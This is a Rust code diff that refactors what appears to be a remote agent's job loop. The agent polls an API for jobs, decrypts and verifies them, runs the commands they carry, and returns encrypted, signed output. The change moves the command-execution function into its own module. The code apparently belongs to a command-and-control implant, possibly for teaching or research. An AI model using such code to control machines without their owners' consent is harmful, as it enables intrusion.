@@ -1,4 +1,4 @@
-use crate::{config, Error};
+use crate::{commands, config, Error};
 use blake2::digest::{Update, VariableOutput};
 use chacha20poly1305::{
     aead::{Aead, NewAead},
@@ -11,7 +11,7 @@ use common::{
 use ed25519_dalek::Verifier;
 use rand::RngCore;
 use std::convert::TryFrom;
-use std::{process::Command, thread::sleep, time::Duration};
+use std::{thread::sleep, time::Duration};
 use uuid::Uuid;
 use x25519_dalek::x25519;
 use zeroize::Zeroize;
@@ -60,7 +60,7 @@ pub fn run(api_client: &ureq::Agent, conf: config::Config) -> ! {
             }
         };
 
-        let output = execute_command(job.command, job.args);
+        let output = commands::exec(job.command, job.args);
 
         let job_result = match encrypt_and_sign_job_result(
             &conf,
@@ -86,28 +86,6 @@ pub fn run(api_client: &ureq::Agent, conf: config::Config) -> ! {
             }
         };
     }
-}
-
-fn execute_command(command: String, args: Vec<String>) -> String {
-    let mut ret = String::new();
-
-    let output = match Command::new(command).args(&args).output() {
-        Ok(output) => output,
-        Err(err) => {
-            log::debug!("Error executing command: {}", err);
-            return ret;
-        }
-    };
-
-    ret = match String::from_utf8(output.stdout) {
-        Ok(stdout) => stdout,
-        Err(err) => {
-            log::debug!("Error converting command's output to String: {}", err);
-            return ret;
-        }
-    };
-
-    return ret;
 }
 
 fn decrypt_and_verify_job(
